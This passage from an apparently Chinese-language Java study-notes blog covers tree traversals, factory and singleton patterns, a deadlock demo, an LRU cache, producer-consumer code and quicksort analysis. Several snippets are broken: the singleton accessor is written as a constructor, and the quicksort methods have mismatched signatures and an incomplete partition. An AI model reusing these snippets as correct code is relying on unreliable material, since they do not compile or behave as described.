class="keyword">new</span> ArrayList();</span><br><span class="line">       <span class="keyword">if</span>(root==<span class="keyword">null</span>) <span class="keyword">return</span> res;</span><br><span class="line">       Stack&lt;TreeNode&gt; s = <span class="keyword">new</span> Stack();</span><br><span class="line">       s.push(root);</span><br><span class="line">       <span class="keyword">while</span>(!s.isEmpty())&#123;</span><br><span class="line">           root=s.pop();</span><br><span class="line">           res.add(root.val);</span><br><span class="line">           <span class="keyword">if</span>(root.right!=<span class="keyword">null</span>) s.push(root.right);</span><br><span class="line">           <span class="keyword">if</span>(root.left!=<span class="keyword">null</span>) s.push(root.left);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> res;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h2><span id="树的中序遍历-">树的中序遍历 -</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">inorderTraversal</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">        List&lt;Integer&gt; res = <span class="keyword">new</span> ArrayList();</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="keyword">null</span>) <span class="keyword">return</span> res;</span><br><span class="line">        Stack&lt;TreeNode&gt; s = <span class="keyword">new</span> Stack();       </span><br><span class="line">        <span class="keyword">while</span>(!s.isEmpty()||root!=<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(root!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                <span class="keyword">while</span>(root!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                    s.push(root);</span><br><span class="line">                    root=root.left;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                root = s.pop();</span><br><span class="line">                res.add(root.val);</span><br><span class="line">                root=root.right;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2><span id="树的后序遍历-">树的后序遍历 -</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">postorderTraversal</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">        List&lt;Integer&gt; res = <span class="keyword">new</span> ArrayList();</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="keyword">null</span>) <span class="keyword">return</span> res;</span><br><span class="line">        Stack&lt;TreeNode&gt; s1 = <span class="keyword">new</span> Stack();</span><br><span class="line">        Stack&lt;TreeNode&gt; s2 = <span class="keyword">new</span> Stack();</span><br><span class="line">        s1.push(root);</span><br><span class="line">        <span class="keyword">while</span>(!s1.isEmpty())&#123;</span><br><span class="line">            TreeNode tmp = s1.pop();</span><br><span class="line">            s2.push(tmp);</span><br><span class="line">            <span class="keyword">if</span>(tmp.left!=<span class="keyword">null</span>) s1.push(tmp.left);</span><br><span class="line">            <span class="keyword">if</span>(tmp.right!=<span class="keyword">null</span>) s1.push(tmp.right);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(!s2.isEmpty()) res.add(s2.pop().val);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h1><span id="设计模式">设计模式</span></h1><h2><span id="工厂模式">工厂模式</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">FoodFactroy</span></span>&#123;</span><br><span class="line">    <span class="function">Food <span class="title">makeFood</span><span class="params">(String name)</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ChineseFoodFactory</span> <span class="keyword">implements</span> <span class="title">FoodFactory</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Food <span class="title">makeFood</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(name.equals(<span class="string">"A"</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> ChineseFoodA();</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span> (name.equals(<span class="string">"B"</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> ChineseFoodB();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AmericanFoodFactory</span> <span class="keyword">implements</span> <span class="title">FoodFactory</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Food <span class="title">makeFood</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (name.equals(<span class="string">"A"</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> AmericanFoodA();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (name.equals(<span class="string">"B"</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> AmericanFoodB();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">APP</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 先选择一个具体的工厂</span></span><br><span class="line">        FoodFactory factory = <span class="keyword">new</span> ChineseFoodFactory();</span><br><span class="line">        <span class="comment">// 由第一步的工厂产生具体的对象，不同的工厂造出不一样的对象</span></span><br><span class="line">        Food food = factory.makeFood(<span class="string">"A"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="单例模式">单例模式</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">volatile</span> Singleton instance=<span class="keyword">null</span>;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Singleton</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Singleton</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(instance==<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">synchronized</span>(Singleton<span class="class">.<span class="keyword">class</span>)</span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(instance==<span class="keyword">null</span>)&#123;</span><br><span class="line">                    instance = <span class="keyword">new</span> Singleton();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一个 if 语句用来避免 uniqueInstance 已经被实例化之后的加锁操作，而第二个 if 语句进行了加锁，所以只能有一个线程进入，就不会出现 uniqueInstance == null 时两个线程同时进行实例化操作。</p><p>的， uniqueInstance = new Singleton(); 这段代码其实是分为三步执行：</p><ol><li>为 uniqueInstance 分配内存空间</li><li>初始化 uniqueInstance</li><li>将 uniqueInstance 指向分配的内存地址</li></ol><p>使用 volatile 可以禁止 JVM 的指令重排，保证在多线程环境下也能正常运行。</p><h1><span id="算法">算法</span></h1><h2><span id="死锁">死锁</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DeadLock</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> Object lock1=<span class="keyword">new</span> Object();</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> Object lock2=<span class="keyword">new</span> Object();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">new</span> Thread(<span class="keyword">new</span> A()).start();</span><br><span class="line">        <span class="keyword">new</span> Thread(<span class="keyword">new</span> B()).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span> <span class="keyword">implements</span> <span class="title">Runnable</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">while</span>(<span class="keyword">true</span>)&#123;</span><br><span class="line">            <span class="keyword">synchronized</span>(DeadLock.lock1)&#123;</span><br><span class="line">                System.out.println(<span class="string">"A get lock1"</span>);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Thread.sleep(<span class="number">100</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">synchronized</span> (DeadLock.lock2)&#123;</span><br><span class="line">                    System.out.println(<span class="string">"A get lock2"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">B</span> <span class="keyword">implements</span> <span class="title">Runnable</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">while</span>(<span class="keyword">true</span>)&#123;</span><br><span class="line">            <span class="keyword">synchronized</span>(DeadLock.lock2)&#123;</span><br><span class="line">                System.out.println(<span class="string">"B get lock2"</span>);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Thread.sleep(<span class="number">100</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">synchronized</span> (DeadLock.lock1)&#123;</span><br><span class="line">                    System.out.println(<span class="string">"B get lock1"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3><span id="一什么是死锁">一.什么是死锁？</span></h3><p>　　　死锁是由于两个或以上的线程互相持有对方需要的资源，导致这些线程处于等待状态，无法执行。</p><h3><span id="二产生死锁的四个必要条件">二.产生死锁的四个必要条件</span></h3><p>　　　1.互斥性：线程对资源的占有是排他性的，一个资源只能被一个线程占有，直到释放。</p><p>　　　2.请求和保持条件：一个线程对请求被占有资源发生阻塞时，对已经获得的资源不释放。</p><p>　　　3.不剥夺：一个线程在释放资源之前，其他的线程无法剥夺占用。</p><p>　　　4.循环等待：发生死锁时，线程进入死循环，永久阻塞。</p><h3><span id="三避免死锁的方法">三.避免死锁的方法</span></h3><h4><span id="1破坏请求和保持条件">　　　1.破坏“请求和保持”条件</span></h4><p>　　　　一次性申请所有需要用到的资源，不要一次一次来申请，当申请的资源有一些没空，那就让线程等待。不过这个方法比较浪费资源，进程可能经常处于饥饿状态。还有一种方法是，要求进程在申请资源前，要释放自己拥有的资源。</p><h4><span id="2破坏不可抢占条件">　　　2.破坏“不可抢占”条件</span></h4><p>　　　　允许进程进行抢占，方法一：如果去抢资源，被拒绝，就释放自己的资源。方法二：操作系统允许抢，只要你优先级大，可以抢到。</p><h4><span id="3破坏循环等待条件">　　　3.破坏“循环等待”条件</span></h4><p>　　　　将系统中的所有资源统一编号，进程可在任何时刻提出资源申请，但所有申请必须按照资源的编号顺序（升序）提出</p><h2><span id="lru">LRU</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LRUCache</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> cap,count;</span><br><span class="line">    HashMap&lt;Integer,Node&gt; map=<span class="keyword">new</span> HashMap();</span><br><span class="line">    Node head,tail;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Node</span></span>&#123;</span><br><span class="line">        Node pre,next;</span><br><span class="line">        <span class="keyword">int</span> val,key;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">Node</span><span class="params">(<span class="keyword">int</span> key,<span class="keyword">int</span> value)</span></span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.key=key;</span><br><span class="line">            <span class="keyword">this</span>.val=value;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">Node</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">this</span>(<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">LRUCache</span><span class="params">(<span class="keyword">int</span> capacity)</span> </span>&#123;</span><br><span class="line">        cap=capacity;</span><br><span class="line">        count=<span class="number">0</span>;</span><br><span class="line">        head=<span class="keyword">new</span> Node();</span><br><span class="line">        tail=<span class="keyword">new</span> Node();</span><br><span class="line">        head.next=tail;</span><br><span class="line">        tail.pre=head;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">get</span><span class="params">(<span class="keyword">int</span> key)</span> </span>&#123;</span><br><span class="line">        Node n = map.get(key);</span><br><span class="line">        <span class="keyword">if</span>(n==<span class="keyword">null</span>) <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        remove(n);</span><br><span class="line">        add(n);</span><br><span class="line">        <span class="keyword">return</span> n.val;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">put</span><span class="params">(<span class="keyword">int</span> key, <span class="keyword">int</span> value)</span> </span>&#123;</span><br><span class="line">        Node n = map.get(key);</span><br><span class="line">        <span class="keyword">if</span>(n==<span class="keyword">null</span>)&#123;</span><br><span class="line">            n = <span class="keyword">new</span> Node(key,value);</span><br><span class="line">            map.put(key,n);</span><br><span class="line">            add(n);</span><br><span class="line">            count++;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            n.val=value;</span><br><span class="line">            remove(n);</span><br><span class="line">            add(n);</span><br><span class="line">        &#125;<span class="keyword">if</span>(count&gt;cap)&#123;</span><br><span class="line">            Node del=tail.pre;</span><br><span class="line">            remove(del);</span><br><span class="line">            map.remove(del.key);</span><br><span class="line">            count--;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(Node n)</span></span>&#123;</span><br><span class="line">        Node after=head.next;</span><br><span class="line">        head.next=n;</span><br><span class="line">        n.pre=head;</span><br><span class="line">        n.next=after;</span><br><span class="line">        after.pre=n;</span><br><span class="line">    &#125;</span><br><span class="line">     <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">remove</span><span class="params">(Node n)</span></span>&#123;</span><br><span class="line">         Node before=n.pre,after=n.next;</span><br><span class="line">         before.next=after;</span><br><span class="line">         after.pre=before;</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="生产者消费者">生产者消费者</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ClothesFactory</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">int</span> size=<span class="number">10</span>;</span><br><span class="line">    <span class="keyword">private</span> LinkedList&lt;Object&gt; list = <span class="keyword">new</span> LinkedList();</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">produce</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">synchronized</span>(list)&#123;</span><br><span class="line">            <span class="keyword">while</span>(list.size()&gt;=size)&#123;</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    list.wait();</span><br><span class="line">                &#125;<span class="keyword">catch</span>(InterruptedException e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            list.addFirst(<span class="keyword">new</span> Object());</span><br><span class="line">            list.notifyAll();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">comsume</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">synchronized</span>(list)&#123;</span><br><span class="line">            <span class="keyword">while</span>(list.size()&lt;=<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    list.wait();</span><br><span class="line">                &#125;<span class="keyword">catch</span>(InterruptedException e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            list.removeLast();</span><br><span class="line">            list.notifyAll();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Producer</span> <span class="keyword">implements</span> <span class="title">Runnable</span></span>&#123;</span><br><span class="line"><span class="keyword">private</span> ClothesFactory clothesFactory;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Producer</span><span class="params">(ClothesFactory clothesFactory)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.clothesFactory=clothesFactory;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">while</span>(<span class="keyword">true</span>)&#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                clothesFactory.produce();</span><br><span class="line">            &#125;<span class="keyword">catch</span>(InterruptedException e)&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Comsumer</span> <span class="keyword">implements</span> <span class="title">Runnable</span></span>&#123;</span><br><span class="line"><span class="keyword">private</span> ClothesFactory clothesFactory;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Comsumer</span><span class="params">(ClothesFactory clothesFactory)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.clothesFactory=clothesFactory;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">while</span>(<span class="keyword">true</span>)&#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                clothesFactory.comsume();</span><br><span class="line">            &#125;<span class="keyword">catch</span>(InterruptedException e)&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1><span id="排序">排序</span></h1><p>分析时间复杂度</p><h2><span id="快排">快排 √</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sort</span><span class="params">(<span class="keyword">int</span> a[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> lo=<span class="number">0</span>,hi=a.length-<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span>(lo&lt;hi)&#123;</span><br><span class="line">        <span class="keyword">int</span> mid = qs(a,lo,hi);</span><br><span class="line">        sort(a,lo,mid-<span class="number">1</span>);</span><br><span class="line">        sort(a,mid+<span class="number">1</span>,hi);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">qs</span><span class="params">(<span class="keyword">int</span>[] a,<span class="keyword">int</span> lo,<span class="keyword">int</span> hi)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i=lo,j=hi,x=a[lo];</span><br><span class="line">    <span class="keyword">if</span>(i&lt;j)&#123;</span><br><span class="line">      <span class="keyword">while</span>(i&lt;j&amp;&amp;a[j]&gt;=x)j--;</span><br><span class="line">      <span class="keyword">if</span>(i&lt;j) a[i]=a[j];</span><br><span class="line">      <span class="keyword">while</span>(i&lt;j&amp;&amp;a[i]&lt;x)i++;</span><br><span class="line">      <span class="keyword">if</span>(i&lt;j) a[j]=a[i];        </span><br><span class="line">    &#125;</span><br><span class="line">    a[i]=x;</span><br><span class="line">    <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3><span id="1-最优情况">1、最优情况</span></h3><p>在最优情况下，Partition每次都划分得很均匀，如果排序n个关键字，其递归树的深度就为 [log2n]+1（ [x] 表示不大于 x 的最大整数），即仅需递归 log2n 次，需要时间为T（n）的话，第一次Partiation应该是需要对整个数组扫描一遍，做n次比较。然后，获得的枢轴将数组一分为二，那么各自还需要T（n/2）的时间（注意是最好情况，所以平分两半）。于是不断地划分下去，就有了下面的不等式推断：</p><p><img src="http://img.blog.csdn.net/20140522095848359?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvb29oYWhhXzEyMw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt="img"></p><h3><span id="2-最糟糕情况">2、最糟糕情况</span></h3><p>然后再来看最糟糕情况下的快排，当待排序的序列为正序或逆序排列时，且每次划分只得到一个比上一次划分少一个记录的子序列，注意另一个为空。如果递归树画出来，它就是一棵斜树。此时需要执行n‐1次递归调用，且第i次划分需要经过n‐i次关键字的比较才能找到第i个记录，也就是枢轴的位置，因此比较次数为</p><p><img src="image-20200414160932308.png" alt></p><h2><span id="快速选择">快速选择 √</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 